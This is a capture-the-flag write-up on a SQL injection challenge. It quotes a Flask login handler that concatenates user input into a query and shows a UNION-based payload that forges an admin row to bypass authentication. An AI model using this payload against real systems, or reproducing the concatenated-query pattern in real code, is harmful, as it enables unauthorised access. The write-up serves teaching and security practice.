Another SQL injection challenge, this time, we’ve got the server-side script too. Here’s the interesting part from the code:

```python
def do_login(user, password, admin):
    resp = make_response(redirect('/'))
    session['user'] = user
    session['admin'] = admin
    return resp

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user', '')
    password = request.form.get('password', '')

    c = get_db().cursor()
    statement = "SELECT * FROM users WHERE name ='" + user + "'"
    result = c.execute(statement).fetchone()
    if result is None:
        return render_template('error.html', error='Invalid user'), 403
    if result[1] != password:
        return render_template('error.html', error='Invalid password'), 403
    else:
        return do_login(user, password, result[2])
```

Right off the bat, yeah — there’s an SQL injection vulnerability. Not shocking, that’s the whole point of the challenge. But looking at this, we can also infer the structure of the `users` table: a `name`, a `password`, and the third column seems to be a boolean flag — probably marking whether the user is an admin.

Here’s where it gets fun. If we use this payload as the username:

```
' UNION SELECT 'admin', 'pass', 1--
```

Then the SQL query turns into:

```
SELECT * FROM users WHERE name ='' UNION SELECT 'admin', 'pass', 1-- '
```

The first part (`name = ''`) obviously returns nothing. But then we `UNION` in a totally fabricated row: `'admin', 'pass', 1`. The `--` at the end comments out whatever comes after, so it's safely ignored.

Now if we enter `"pass"` as the password, it matches the password in our fake row. The server happily thinks we just logged in as an admin, even though that user doesn't actually exist in the database.

And just like that — we’re in. Admin access granted. Time to grab that flag.
